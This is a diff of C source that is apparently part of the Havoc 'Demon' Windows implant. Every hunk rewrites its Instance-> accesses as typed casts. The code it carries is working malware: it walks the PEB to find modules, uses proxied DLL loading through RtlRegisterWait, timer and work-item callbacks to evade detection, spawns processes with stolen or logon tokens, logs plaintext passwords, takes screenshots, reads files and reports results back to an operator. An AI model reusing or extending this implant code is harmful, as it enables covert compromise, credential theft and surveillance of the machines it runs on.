@@ -71,11 +71,11 @@ PVOID LdrModulePeb(
     PPEB			      Peb = NULL;
 
     /* Get pointer to list */
-    if ( ! Instance->Teb ) {
-        Instance->Teb = NtCurrentTeb();
+    if ( ! ((INSTANCE *)Instance)->Teb ) {
+        ((INSTANCE *)Instance)->Teb = NtCurrentTeb();
     }
 
-    Peb = Instance->Teb->ProcessEnvironmentBlock;
+    Peb = ((INSTANCE *)Instance)->Teb->ProcessEnvironmentBlock;
     Hdr = & Peb->Ldr->InLoadOrderModuleList;
     Ent = Hdr->Flink;
 
@@ -107,13 +107,13 @@ PVOID LdrModulePebByString(
     ULONG                 Idx  = 0;
 
     /* Get pointer to list */
-    if ( ! Instance->Teb ) {
-        Instance->Teb = NtCurrentTeb();
+    if ( ! ((INSTANCE *)Instance)->Teb ) {
+        ((INSTANCE *)Instance)->Teb = NtCurrentTeb();
     }
 
     Name = MmHeapAlloc( MAX_PATH );
 
-    Peb = Instance->Teb->ProcessEnvironmentBlock;
+    Peb = ((INSTANCE *)Instance)->Teb->ProcessEnvironmentBlock;
     Hdr = & Peb->Ldr->InLoadOrderModuleList;
     Ent = Hdr->Flink;
 
@@ -176,8 +176,8 @@ PVOID LdrModuleSearch(
     Dll[ 2 ] = HideChar( 'L' );
     Dll[ 0 ] = HideChar( '.' );
 
-    Entry      = Instance->Teb->ProcessEnvironmentBlock->Ldr->InLoadOrderModuleList.Flink;
-    FirstEntry = &Instance->Teb->ProcessEnvironmentBlock->Ldr->InLoadOrderModuleList.Flink;
+    Entry      = ((INSTANCE *)Instance)->Teb->ProcessEnvironmentBlock->Ldr->InLoadOrderModuleList.Flink;
+    FirstEntry = &((INSTANCE *)Instance)->Teb->ProcessEnvironmentBlock->Ldr->InLoadOrderModuleList.Flink;
 
     StringCopyW( Name, ModuleName );
 
@@ -244,10 +244,10 @@ PVOID LdrModuleLoad(
     }
 
     /* if proxy module loading is enabled */
-    if ( Instance->Config.Implant.ProxyLoading )
+    if ( ((INSTANCE *)Instance)->Config.Implant.ProxyLoading )
     {
         /* load library using RtlRegisterWait + LoadLibraryW */
-        if ( ( Instance->Config.Implant.ProxyLoading == PROXYLOAD_RTLREGISTERWAIT ) && Instance->Win32.RtlRegisterWait )
+        if ( ( ((INSTANCE *)Instance)->Config.Implant.ProxyLoading == PROXYLOAD_RTLREGISTERWAIT ) && ((INSTANCE *)Instance)->Win32.RtlRegisterWait )
         {
             PUTS( "Loading module using RtlRegisterWait" )
 
@@ -257,36 +257,36 @@ PVOID LdrModuleLoad(
             }
 
             /* call LoadLibraryW */
-            if ( ! NT_SUCCESS( NtStatus = Instance->Win32.RtlRegisterWait( &Timer, Event, C_PTR( Instance->Win32.LoadLibraryW ), NameW, 0, WT_EXECUTEONLYONCE | WT_EXECUTEINWAITTHREAD ) ) ) {
+            if ( ! NT_SUCCESS( NtStatus = ((INSTANCE *)Instance)->Win32.RtlRegisterWait( &Timer, Event, C_PTR( ((INSTANCE *)Instance)->Win32.LoadLibraryW ), NameW, 0, WT_EXECUTEONLYONCE | WT_EXECUTEINWAITTHREAD ) ) ) {
                 PRINTF( "RtlRegisterWait: %p\n", NtStatus )
                 goto DEFAULT;
             }
         }
 
         /* load library using RtlCreateTimer + LoadLibraryW */
-        else if ( ( Instance->Config.Implant.ProxyLoading == PROXYLOAD_RTLCREATETIMER ) && Instance->Win32.RtlCreateTimer )
+        else if ( ( ((INSTANCE *)Instance)->Config.Implant.ProxyLoading == PROXYLOAD_RTLCREATETIMER ) && ((INSTANCE *)Instance)->Win32.RtlCreateTimer )
         {
             PUTS( "Loading module using RtlCreateTimer" )
 
             /* create timer queue */
-            if ( ! NT_SUCCESS( NtStatus = Instance->Win32.RtlCreateTimerQueue( &Queue ) ) ) {
+            if ( ! NT_SUCCESS( NtStatus = ((INSTANCE *)Instance)->Win32.RtlCreateTimerQueue( &Queue ) ) ) {
                 PRINTF( "RtlCreateTimerQueue Failed => %p\n", NtStatus )
                 goto DEFAULT;
             }
 
             /* call LoadLibraryW */
-            if ( ! NT_SUCCESS( NtStatus = Instance->Win32.RtlCreateTimer( Queue, &Timer, C_PTR( Instance->Win32.LoadLibraryW ), NameW, 0, 0, WT_EXECUTEINTIMERTHREAD ) ) ) {
+            if ( ! NT_SUCCESS( NtStatus = ((INSTANCE *)Instance)->Win32.RtlCreateTimer( Queue, &Timer, C_PTR( ((INSTANCE *)Instance)->Win32.LoadLibraryW ), NameW, 0, 0, WT_EXECUTEINTIMERTHREAD ) ) ) {
                 PRINTF( "RtlCreateTimer: %p\n", NtStatus )
                 goto DEFAULT;
             }
         }
         /* load library using RtlQueueWorkItem + LoadLibraryW */
-        else if ( ( Instance->Config.Implant.ProxyLoading == PROXYLOAD_RTLQUEUEWORKITEM ) && Instance->Win32.RtlQueueWorkItem )
+        else if ( ( ((INSTANCE *)Instance)->Config.Implant.ProxyLoading == PROXYLOAD_RTLQUEUEWORKITEM ) && ((INSTANCE *)Instance)->Win32.RtlQueueWorkItem )
         {
             PUTS( "Loading module using RtlQueueWorkItem" )
 
             /* call LoadLibraryW and load specified module */
-            if ( ! NT_SUCCESS( NtStatus = Instance->Win32.RtlQueueWorkItem( C_PTR( Instance->Win32.LoadLibraryW ), NameW, WT_EXECUTEDEFAULT ) ) ) {
+            if ( ! NT_SUCCESS( NtStatus = ((INSTANCE *)Instance)->Win32.RtlQueueWorkItem( C_PTR( ((INSTANCE *)Instance)->Win32.LoadLibraryW ), NameW, WT_EXECUTEDEFAULT ) ) ) {
                 PRINTF( "RtlQueueWorkItem Failed: %p\n", NtStatus )
 
                 /* if we failed to load the module via RtlQueueWorkItem + LoadLibraryW then
@@ -330,7 +330,7 @@ PVOID LdrModuleLoad(
     {
     DEFAULT:
         /* load library using LdrLoadDll */
-        if ( Instance->Win32.LdrLoadDll )
+        if ( ((INSTANCE *)Instance)->Win32.LdrLoadDll )
         {
             PUTS( "Loading module using LdrLoadDll" )
 
@@ -339,7 +339,7 @@ PVOID LdrModuleLoad(
             UnicodeString.Length        = DestSize;
             UnicodeString.MaximumLength = DestSize + sizeof( WCHAR );
 
-            if ( ! NT_SUCCESS( NtStatus = Instance->Win32.LdrLoadDll( NULL, 0, &UnicodeString, &Module ) ) ) {
+            if ( ! NT_SUCCESS( NtStatus = ((INSTANCE *)Instance)->Win32.LdrLoadDll( NULL, 0, &UnicodeString, &Module ) ) ) {
                 PRINTF( "LdrLoadDll Failed: %p\n", NtStatus )
                 NtSetLastError( NtStatus );
             }
@@ -361,7 +361,7 @@ END:
 
     /* close queue */
     if ( Queue ) {
-        Instance->Win32.RtlDeleteTimerQueue( Queue );
+        ((INSTANCE *)Instance)->Win32.RtlDeleteTimerQueue( Queue );
         Queue = NULL;
     }
 
@@ -414,8 +414,8 @@ PVOID LdrFunctionAddr(
                 AnsiString.MaximumLength = AnsiString.Length + sizeof( CHAR );
                 AnsiString.Buffer        = FunctionName;
 
-                if ( Instance->Win32.LdrGetProcedureAddress ) {
-                    if ( ! NT_SUCCESS( Instance->Win32.LdrGetProcedureAddress( Module, &AnsiString, 0, &FunctionAddr ) ) ) {
+                if ( ((INSTANCE *)Instance)->Win32.LdrGetProcedureAddress ) {
+                    if ( ! NT_SUCCESS( ((INSTANCE *)Instance)->Win32.LdrGetProcedureAddress( Module, &AnsiString, 0, &FunctionAddr ) ) ) {
                         return NULL;
                     }
                 } else {
@@ -440,7 +440,7 @@ PVOID LdrFunctionAddr(
 UINT32 GetSyscallSize(
     VOID
 ) {
-    PVOID                   Module           = Instance->Modules.Ntdll;
+    PVOID                   Module           = ((INSTANCE *)Instance)->Modules.Ntdll;
     PIMAGE_NT_HEADERS       NtHeader         = { 0 };
     PIMAGE_EXPORT_DIRECTORY ExpDirectory     = { 0 };
     SIZE_T                  ExpDirectorySize = { 0 };
@@ -458,8 +458,8 @@ UINT32 GetSyscallSize(
     if ( ! Module )
         return 0;
 
-    if ( Instance->Syscall.Size )
-        return Instance->Syscall.Size;
+    if ( ((INSTANCE *)Instance)->Syscall.Size )
+        return ((INSTANCE *)Instance)->Syscall.Size;
 
     NtHeader         = C_PTR( Module + ( ( PIMAGE_DOS_HEADER ) Module )->e_lfanew );
     ExpDirectory     = C_PTR( Module + NtHeader->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].VirtualAddress );
@@ -501,9 +501,9 @@ UINT32 GetSyscallSize(
     }
 
     // by now, we should have the size of a syscall stub
-    Instance->Syscall.Size = SyscallSize;
+    ((INSTANCE *)Instance)->Syscall.Size = SyscallSize;
 
-    return Instance->Syscall.Size;
+    return ((INSTANCE *)Instance)->Syscall.Size;
 }
 
 /*!
@@ -529,7 +529,7 @@ HANDLE ProcessOpen(
     /* open process handle */
     if ( ! NT_SUCCESS( NtStatus = SysNtOpenProcess( &Process, Access, &ObjAttr, &Client ) ) ) {
         PRINTF( "NtOpenProcess Failed => %lx\n", NtStatus )
-        NtSetLastError( Instance->Win32.RtlNtStatusToDosError( NtStatus ) );
+        NtSetLastError( ((INSTANCE *)Instance)->Win32.RtlNtStatusToDosError( NtStatus ) );
         return NULL;
     }
 
@@ -551,7 +551,7 @@ BOOL ProcessIsWow(
         return FALSE;
     }
 
-    if ( Instance->Session.OS_Arch == PROCESSOR_ARCHITECTURE_INTEL ) {
+    if ( ((INSTANCE *)Instance)->Session.OS_Arch == PROCESSOR_ARCHITECTURE_INTEL ) {
         return FALSE;
     }
 
@@ -604,7 +604,7 @@ BOOL ProcessCreate(
     if ( Piped )
     {
         PUTS( "Piped enabled" )
-        AnonPipe = Instance->Win32.LocalAlloc( LPTR, sizeof( ANONPIPE ) );
+        AnonPipe = ((INSTANCE *)Instance)->Win32.LocalAlloc( LPTR, sizeof( ANONPIPE ) );
         MemSet( AnonPipe, 0, sizeof( ANONPIPE ) );
         AnonPipesInit( AnonPipe );
 
@@ -621,10 +621,10 @@ BOOL ProcessCreate(
     }
 
 #if _M_IX86
-    if ( ! x86 && Instance->Win32.Wow64DisableWow64FsRedirection )
+    if ( ! x86 && ((INSTANCE *)Instance)->Win32.Wow64DisableWow64FsRedirection )
     {
         PUTS( "Enable Wow64 process support" )
-        if ( ! Instance->Win32.Wow64DisableWow64FsRedirection( &Wow64Value ) )
+        if ( ! ((INSTANCE *)Instance)->Win32.Wow64DisableWow64FsRedirection( &Wow64Value ) )
         {
             PRINTF( "Failed to disable wow64 redirection: %d : %x\n", NtGetLastError(), Wow64Value )
             PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
@@ -636,14 +636,14 @@ BOOL ProcessCreate(
     }
 #endif
 
-    if ( Instance->Tokens.Impersonate )
+    if ( ((INSTANCE *)Instance)->Tokens.Impersonate )
     {
         PUTS( "Impersonate" )
 
         LPWSTR lpCurrentDirectory   = NULL;
         WCHAR  Path[ MAX_PATH * 2 ] = { 0 };
 
-        if ( Instance->Win32.GetCurrentDirectoryW( MAX_PATH * 2, Path ) ) {
+        if ( ((INSTANCE *)Instance)->Win32.GetCurrentDirectoryW( MAX_PATH * 2, Path ) ) {
             lpCurrentDirectory = Path;
         }
 
@@ -654,12 +654,12 @@ BOOL ProcessCreate(
         PRINTF( "CmdLine           : %ls\n", CmdLine )
         PRINTF( "lpCurrentDirectory: %ls\n", lpCurrentDirectory )
 
-        if ( Instance->Tokens.Token->Type == TOKEN_TYPE_STOLEN )
+        if ( ((INSTANCE *)Instance)->Tokens.Token->Type == TOKEN_TYPE_STOLEN )
         {
             // Duplicate to make primary token (try delegation first)
-            if ( ! SysDuplicateTokenEx( Instance->Tokens.Token->Handle, TOKEN_ALL_ACCESS, NULL, SecurityDelegation, TokenPrimary, &PrimaryToken ) )
+            if ( ! SysDuplicateTokenEx( ((INSTANCE *)Instance)->Tokens.Token->Handle, TOKEN_ALL_ACCESS, NULL, SecurityDelegation, TokenPrimary, &PrimaryToken ) )
             {
-                if ( ! SysDuplicateTokenEx( Instance->Tokens.Token->Handle, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &PrimaryToken ) )
+                if ( ! SysDuplicateTokenEx( ((INSTANCE *)Instance)->Tokens.Token->Handle, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &PrimaryToken ) )
                 {
                     PRINTF( "Failed to duplicate token [%d]\n", NtGetLastError() );
                     PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
@@ -669,7 +669,7 @@ BOOL ProcessCreate(
             }
 
             PUTS( "CreateProcessWithTokenW" )
-            if ( ! Instance->Win32.CreateProcessWithTokenW(
+            if ( ! ((INSTANCE *)Instance)->Win32.CreateProcessWithTokenW(
                     PrimaryToken,
                     LOGON_NETCREDENTIALS_ONLY,
                     App,
@@ -688,14 +688,14 @@ BOOL ProcessCreate(
                 goto Cleanup;
             }
         }
-        else if ( Instance->Tokens.Token->Type == TOKEN_TYPE_MAKE_NETWORK )
+        else if ( ((INSTANCE *)Instance)->Tokens.Token->Type == TOKEN_TYPE_MAKE_NETWORK )
         {
             PUTS( "CreateProcessWithLogonW" )
-            PRINTF( "lpUser[%s] lpDomain[%s] lpPassword[%s]", Instance->Tokens.Token->lpUser, Instance->Tokens.Token->lpDomain, Instance->Tokens.Token->lpPassword )
-            if ( ! Instance->Win32.CreateProcessWithLogonW(
-                    Instance->Tokens.Token->lpUser,
-                    Instance->Tokens.Token->lpDomain,
-                    Instance->Tokens.Token->lpPassword,
+            PRINTF( "lpUser[%s] lpDomain[%s] lpPassword[%s]", ((INSTANCE *)Instance)->Tokens.Token->lpUser, ((INSTANCE *)Instance)->Tokens.Token->lpDomain, ((INSTANCE *)Instance)->Tokens.Token->lpPassword )
+            if ( ! ((INSTANCE *)Instance)->Win32.CreateProcessWithLogonW(
+                    ((INSTANCE *)Instance)->Tokens.Token->lpUser,
+                    ((INSTANCE *)Instance)->Tokens.Token->lpDomain,
+                    ((INSTANCE *)Instance)->Tokens.Token->lpPassword,
                     LOGON_NETCREDENTIALS_ONLY,
                     App,
                     CmdLine,
@@ -714,7 +714,7 @@ BOOL ProcessCreate(
     }
     else
     {
-        if ( ! Instance->Win32.CreateProcessW(
+        if ( ! ((INSTANCE *)Instance)->Win32.CreateProcessW(
                 App,
                 CmdLine,
                 NULL,
@@ -734,7 +734,7 @@ BOOL ProcessCreate(
     }
 
     /* Check if we managed to spawn a process */
-    if ( ProcessInfo->hProcess && Instance->Config.Implant.Verbose )
+    if ( ProcessInfo->hProcess && ((INSTANCE *)Instance)->Config.Implant.Verbose )
     {
         PUTS( "Send info back" )
         if ( ! CmdLine )
@@ -747,7 +747,7 @@ BOOL ProcessCreate(
         {
             INT32 i  = 0;
             INT32 x  = ( INT32 ) StringLengthW( CmdLine );
-            PWCHAR s = Instance->Win32.LocalAlloc( LPTR, x * sizeof( WCHAR ) );
+            PWCHAR s = ((INSTANCE *)Instance)->Win32.LocalAlloc( LPTR, x * sizeof( WCHAR ) );
 
             MemCopy( s, CmdLine, x );
 
@@ -770,12 +770,12 @@ BOOL ProcessCreate(
     Cleanup:
 #if _M_IX86
     if ( DisabledWow64Redir ) {
-        Instance->Win32.Wow64RevertWow64FsRedirection( Wow64Value );
+        ((INSTANCE *)Instance)->Win32.Wow64RevertWow64FsRedirection( Wow64Value );
     }
 #endif
 
     if ( Return && Piped ) {
-        JobAdd( Instance->CurrentRequestID, ProcessInfo->dwProcessId, JOB_TYPE_TRACK_PROCESS, JOB_STATE_RUNNING, ProcessInfo->hProcess, AnonPipe );
+        JobAdd( ((INSTANCE *)Instance)->CurrentRequestID, ProcessInfo->dwProcessId, JOB_TYPE_TRACK_PROCESS, JOB_STATE_RUNNING, ProcessInfo->hProcess, AnonPipe );
     }
     else if ( ! Return && Piped )
     {
@@ -892,17 +892,17 @@ BOOL ReadLocalFile(
     DWORD  Read    = 0;
     HANDLE hFile   = NULL;
 
-    hFile = Instance->Win32.CreateFileW( FileName, GENERIC_READ, 0, 0, OPEN_EXISTING, 0, 0 );
+    hFile = ((INSTANCE *)Instance)->Win32.CreateFileW( FileName, GENERIC_READ, 0, 0, OPEN_EXISTING, 0, 0 );
     if ( ( ! hFile ) || ( hFile == INVALID_HANDLE_VALUE ) ) {
         PUTS( "CreateFileW: Failed" )
         PACKAGE_ERROR_WIN32
         goto Cleanup;
     }
 
-    *FileSize    = Instance->Win32.GetFileSize( hFile, 0 );
-    *FileContent = Instance->Win32.LocalAlloc( LPTR, *FileSize );
+    *FileSize    = ((INSTANCE *)Instance)->Win32.GetFileSize( hFile, 0 );
+    *FileContent = ((INSTANCE *)Instance)->Win32.LocalAlloc( LPTR, *FileSize );
 
-    if ( ! Instance->Win32.ReadFile( hFile, *FileContent, *FileSize, &Read, NULL ) ) {
+    if ( ! ((INSTANCE *)Instance)->Win32.ReadFile( hFile, *FileContent, *FileSize, &Read, NULL ) ) {
         PUTS( "ReadFile: Failed" )
         PACKAGE_ERROR_WIN32
         goto Cleanup;
@@ -917,7 +917,7 @@ BOOL ReadLocalFile(
     }
 
     if ( ! Success && *FileContent ) {
-        Instance->Win32.LocalFree( *FileContent );
+        ((INSTANCE *)Instance)->Win32.LocalFree( *FileContent );
         *FileContent = NULL;
         *FileSize    = 0;
     }
@@ -983,7 +983,7 @@ BOOL AnonPipesInit(
 ) {
     SECURITY_ATTRIBUTES SecurityAttr = { sizeof( SECURITY_ATTRIBUTES ), NULL, TRUE };
 
-    if ( ! Instance->Win32.CreatePipe( &AnonPipes->StdOutRead, &AnonPipes->StdOutWrite, &SecurityAttr, 0 ) ) {
+    if ( ! ((INSTANCE *)Instance)->Win32.CreatePipe( &AnonPipes->StdOutRead, &AnonPipes->StdOutWrite, &SecurityAttr, 0 ) ) {
         PACKAGE_ERROR_WIN32
         return FALSE;
     }
@@ -1016,10 +1016,10 @@ VOID AnonPipesRead(
         AnonPipes->StdOutWrite = NULL;
     }
 
-    Buffer = Instance->Win32.LocalAlloc( LPTR, 0 );
+    Buffer = ((INSTANCE *)Instance)->Win32.LocalAlloc( LPTR, 0 );
 
     do {
-        Success = Instance->Win32.ReadFile( AnonPipes->StdOutRead, buf, 1024, &dwRead, NULL );
+        Success = ((INSTANCE *)Instance)->Win32.ReadFile( AnonPipes->StdOutRead, buf, 1024, &dwRead, NULL );
         PRINTF( "dwRead => %d\n", dwRead )
 
         if ( dwRead == 0 ) {
@@ -1028,7 +1028,7 @@ VOID AnonPipesRead(
 
         dwBufferSize += dwRead;
 
-        Buffer = Instance->Win32.LocalReAlloc( Buffer, dwBufferSize, LMEM_MOVEABLE );
+        Buffer = ((INSTANCE *)Instance)->Win32.LocalReAlloc( Buffer, dwBufferSize, LMEM_MOVEABLE );
 
         MemCopy( Buffer + ( dwBufferSize - dwRead ), buf, dwRead );
         MemSet( buf, 0, dwRead );
@@ -1069,27 +1069,27 @@ BOOL WinScreenshot(
     DWORD               BitMapSize  = 0;
 
     // NOTE: if GetSystemMetrics fails, screenshot works anyways
-    INT x = Instance->Win32.GetSystemMetrics( SM_XVIRTUALSCREEN );
-    INT y = Instance->Win32.GetSystemMetrics( SM_YVIRTUALSCREEN );
+    INT x = ((INSTANCE *)Instance)->Win32.GetSystemMetrics( SM_XVIRTUALSCREEN );
+    INT y = ((INSTANCE *)Instance)->Win32.GetSystemMetrics( SM_YVIRTUALSCREEN );
 
     MemSet( &BitFileHdr, 0, sizeof( BITMAPFILEHEADER ) );
     MemSet( &BitInfoHdr, 0, sizeof( BITMAPINFOHEADER ) );
     MemSet( &BitMapInfo, 0, sizeof( BITMAPINFO ) );
     MemSet( &AllDesktops,0, sizeof( BITMAP ) );
 
-    hDC = Instance->Win32.GetDC( NULL );
+    hDC = ((INSTANCE *)Instance)->Win32.GetDC( NULL );
     if ( ! hDC ) {
         PUTS( "GetDC failed" )
         goto Cleanup;
     }
 
-    hTempMap = Instance->Win32.GetCurrentObject( hDC, OBJ_BITMAP );
+    hTempMap = ((INSTANCE *)Instance)->Win32.GetCurrentObject( hDC, OBJ_BITMAP );
     if ( ! hTempMap ) {
         PUTS( "GetCurrentObject failed" )
         goto Cleanup;
     }
 
-    if ( ! Instance->Win32.GetObjectW( hTempMap, sizeof( BITMAP ), &AllDesktops ) ) {
+    if ( ! ((INSTANCE *)Instance)->Win32.GetObjectW( hTempMap, sizeof( BITMAP ), &AllDesktops ) ) {
         PUTS( "GetObjectW failed" )
         goto Cleanup;
     }
@@ -1108,27 +1108,27 @@ BOOL WinScreenshot(
     cbBits     = ( ( ( 24 * AllDesktops.bmWidth + 31 ) &~31 ) / 8 ) * AllDesktops.bmHeight;
 
     BitMapSize  = cbBits + ( sizeof( BITMAPFILEHEADER ) + sizeof( BITMAPINFOHEADER ) );
-    BitMapImage = Instance->Win32.LocalAlloc( LPTR, BitMapSize );
+    BitMapImage = ((INSTANCE *)Instance)->Win32.LocalAlloc( LPTR, BitMapSize );
 
-    hMemDC  = Instance->Win32.CreateCompatibleDC( hDC );
+    hMemDC  = ((INSTANCE *)Instance)->Win32.CreateCompatibleDC( hDC );
     if ( ! hMemDC ) {
         PUTS( "CreateCompatibleDC failed" )
         goto Cleanup;
     }
 
-    hBitmap = Instance->Win32.CreateDIBSection( hDC, &BitMapInfo, DIB_RGB_COLORS, ( VOID** ) &bBits, NULL, 0 );
+    hBitmap = ((INSTANCE *)Instance)->Win32.CreateDIBSection( hDC, &BitMapInfo, DIB_RGB_COLORS, ( VOID** ) &bBits, NULL, 0 );
     if ( ! hBitmap ) {
         PUTS( "CreateDIBSection failed" )
         goto Cleanup;
     }
 
-    ObjPtr = Instance->Win32.SelectObject( hMemDC, hBitmap );
+    ObjPtr = ((INSTANCE *)Instance)->Win32.SelectObject( hMemDC, hBitmap );
     if ( ! ObjPtr || ObjPtr == HGDI_ERROR ) {
         PUTS( "SelectObject failed" )
         goto Cleanup;
     }
 
-    if ( ! Instance->Win32.BitBlt( hMemDC, 0, 0, AllDesktops.bmWidth, AllDesktops.bmHeight, hDC, x, y, SRCCOPY ) ) {
+    if ( ! ((INSTANCE *)Instance)->Win32.BitBlt( hMemDC, 0, 0, AllDesktops.bmWidth, AllDesktops.bmHeight, hDC, x, y, SRCCOPY ) ) {
         PUTS( "BitBlt failed" )
         goto Cleanup;
     }
@@ -1148,19 +1148,19 @@ Cleanup:
         *ImageSize = BitMapSize;
 
     if ( hTempMap ) {
-        Instance->Win32.DeleteObject( hTempMap );
+        ((INSTANCE *)Instance)->Win32.DeleteObject( hTempMap );
     }
 
     if ( hMemDC ) {
-        Instance->Win32.DeleteDC( hMemDC );
+        ((INSTANCE *)Instance)->Win32.DeleteDC( hMemDC );
     }
 
     if ( hDC ) {
-        Instance->Win32.ReleaseDC( NULL, hDC );
+        ((INSTANCE *)Instance)->Win32.ReleaseDC( NULL, hDC );
     }
 
     if ( hBitmap ) {
-        Instance->Win32.DeleteObject( hBitmap );
+        ((INSTANCE *)Instance)->Win32.DeleteObject( hBitmap );
     }
 
     return ReturnValue;
@@ -1180,7 +1180,7 @@ BOOL PipeRead(
     DWORD Total = 0;
 
     do {
-        if ( ! Instance->Win32.ReadFile( Handle, C_PTR( U_PTR( Buffer->Buffer ) + Total ), MIN( ( Buffer->Length - Total ), PIPE_BUFFER_MAX ), &Read, NULL ) ) {
+        if ( ! ((INSTANCE *)Instance)->Win32.ReadFile( Handle, C_PTR( U_PTR( Buffer->Buffer ) + Total ), MIN( ( Buffer->Length - Total ), PIPE_BUFFER_MAX ), &Read, NULL ) ) {
             if ( NtGetLastError() != ERROR_MORE_DATA ) {
                 PRINTF( "ReadFile failed with %d\n", NtGetLastError() )
                 return FALSE;
@@ -1207,7 +1207,7 @@ BOOL PipeWrite(
     DWORD Total   = 0;
 
     do {
-        if ( ! Instance->Win32.WriteFile( Handle, Buffer->Buffer + Total, MIN( ( Buffer->Length - Total ), PIPE_BUFFER_MAX ), &Written , NULL ) ) {
+        if ( ! ((INSTANCE *)Instance)->Win32.WriteFile( Handle, Buffer->Buffer + Total, MIN( ( Buffer->Length - Total ), PIPE_BUFFER_MAX ), &Written , NULL ) ) {
             return FALSE;
         }
 
@@ -1293,7 +1293,7 @@ VOID CfgAddressAdd(
 BOOL EventSet(
     IN HANDLE Event
 ) {
-    return NT_SUCCESS( Instance->Win32.NtSetEvent( Event, NULL ) );
+    return NT_SUCCESS( ((INSTANCE *)Instance)->Win32.NtSetEvent( Event, NULL ) );
 }
 
 
@@ -1307,7 +1307,7 @@ ULONG RandomNumber32(
     ULONG Seed = 0;
 
     Seed = NtGetTickCount();
-    Seed = Instance->Win32.RtlRandomEx( &Seed );
+    Seed = ((INSTANCE *)Instance)->Win32.RtlRandomEx( &Seed );
 
     return Seed;
 }
@@ -1322,7 +1322,7 @@ BOOL RandomBool(
     ULONG Seed = 0;
 
     Seed = NtGetTickCount();
-    Seed = Instance->Win32.RtlRandomEx( &Seed );
+    Seed = ((INSTANCE *)Instance)->Win32.RtlRandomEx( &Seed );
 
     return Seed % 2 == 0 ? TRUE : FALSE;
 }
@@ -1404,7 +1404,7 @@ VOID DemonPrintf( PCHAR fmt, ... )
     PVOID       CallbackOutput       = NULL;
     INT         CallbackSize         = 0;
 
-    if ( ! Instance->Session.Connected ) {
+    if ( ! ((INSTANCE *)Instance)->Session.Connected ) {
         return;
     }
 
@@ -1412,10 +1412,10 @@ VOID DemonPrintf( PCHAR fmt, ... )
 
     va_start( VaListArg, fmt );
 
-    CallbackSize    = Instance->Win32.vsnprintf( NULL, 0, fmt, VaListArg );
-    CallbackOutput  = Instance->Win32.LocalAlloc( LPTR, CallbackSize );
+    CallbackSize    = ((INSTANCE *)Instance)->Win32.vsnprintf( NULL, 0, fmt, VaListArg );
+    CallbackOutput  = ((INSTANCE *)Instance)->Win32.LocalAlloc( LPTR, CallbackSize );
 
-    Instance->Win32.vsnprintf( CallbackOutput, CallbackSize, fmt, VaListArg );
+    ((INSTANCE *)Instance)->Win32.vsnprintf( CallbackOutput, CallbackSize, fmt, VaListArg );
 
     va_end( VaListArg );
 
@@ -1424,7 +1424,7 @@ VOID DemonPrintf( PCHAR fmt, ... )
     PackageTransmit( package );
 
     MemSet( CallbackOutput, 0, CallbackSize );
-    Instance->Win32.LocalFree( CallbackOutput );
+    ((INSTANCE *)Instance)->Win32.LocalFree( CallbackOutput );
 }
 
 #elif defined(SHELLCODE) && defined(DEBUG)
@@ -1438,33 +1438,33 @@ VOID LogToConsole(
     va_list VaListArg    = 0;
 
     // have we initialized all the function addresses?
-    if ( Instance->Win32.AttachConsole == NULL ||
-         Instance->Win32.vsnprintf     == NULL ||
-         Instance->Win32.GetStdHandle  == NULL ||
-         Instance->Win32.WriteConsoleA == NULL ||
-         Instance->Win32.LocalAlloc    == NULL )
+    if ( ((INSTANCE *)Instance)->Win32.AttachConsole == NULL ||
+         ((INSTANCE *)Instance)->Win32.vsnprintf     == NULL ||
+         ((INSTANCE *)Instance)->Win32.GetStdHandle  == NULL ||
+         ((INSTANCE *)Instance)->Win32.WriteConsoleA == NULL ||
+         ((INSTANCE *)Instance)->Win32.LocalAlloc    == NULL )
         return;
 
     // get the handle to the output console
-    if ( Instance->hConsoleOutput == NULL )
+    if ( ((INSTANCE *)Instance)->hConsoleOutput == NULL )
     {
-        Instance->Win32.AttachConsole( ATTACH_PARENT_PROCESS );
-        Instance->hConsoleOutput = Instance->Win32.GetStdHandle( STD_OUTPUT_HANDLE );
-        if ( ! Instance->hConsoleOutput  )
+        ((INSTANCE *)Instance)->Win32.AttachConsole( ATTACH_PARENT_PROCESS );
+        ((INSTANCE *)Instance)->hConsoleOutput = ((INSTANCE *)Instance)->Win32.GetStdHandle( STD_OUTPUT_HANDLE );
+        if ( ! ((INSTANCE *)Instance)->hConsoleOutput  )
             return;
     }
 
     va_start( VaListArg, fmt );
 
     // allocate space for the final string
-    OutputSize   = Instance->Win32.vsnprintf( NULL, 0, fmt, VaListArg ) + 1;
-    OutputString = Instance->Win32.LocalAlloc( LPTR, OutputSize );
+    OutputSize   = ((INSTANCE *)Instance)->Win32.vsnprintf( NULL, 0, fmt, VaListArg ) + 1;
+    OutputString = ((INSTANCE *)Instance)->Win32.LocalAlloc( LPTR, OutputSize );
 
     // write the final string
-    Instance->Win32.vsnprintf( OutputString, OutputSize, fmt, VaListArg );
+    ((INSTANCE *)Instance)->Win32.vsnprintf( OutputString, OutputSize, fmt, VaListArg );
 
     // write it to the console
-    Instance->Win32.WriteConsoleA( Instance->hConsoleOutput, OutputString, OutputSize, NULL, NULL );
+    ((INSTANCE *)Instance)->Win32.WriteConsoleA( ((INSTANCE *)Instance)->hConsoleOutput, OutputString, OutputSize, NULL, NULL );
 
     DATA_FREE( OutputString, OutputSize );
 
@@ -1507,7 +1507,7 @@ PROOT_DIR listDir(
     }
 
     // allocate the path on the heap to keep stack usage low (given that this function is recursive)
-    Path = Instance->Win32.LocalAlloc( LPTR, ( MAX_PATH + 2 + 1 ) * sizeof( WCHAR ) );
+    Path = ((INSTANCE *)Instance)->Win32.LocalAlloc( LPTR, ( MAX_PATH + 2 + 1 ) * sizeof( WCHAR ) );
     if ( ! Path )
     {
         PUTS( "Failed to allocate memory" );
@@ -1519,7 +1519,7 @@ PROOT_DIR listDir(
     MemCopy( Path, StartPath, PathSize * sizeof( WCHAR ) );
 
     // search for the first file in the folder specified
-    hFile = Instance->Win32.FindFirstFileW( Path, &FindData );
+    hFile = ((INSTANCE *)Instance)->Win32.FindFirstFileW( Path, &FindData );
     if ( hFile == INVALID_HANDLE_VALUE )
     {
         PRINTF( "FindFirstFileW failed for path %ls\n", Path );
@@ -1537,8 +1537,8 @@ PROOT_DIR listDir(
         Path[ PathSize ]   = 0x00;
 
         // repeat the search
-        Instance->Win32.FindClose( hFile );
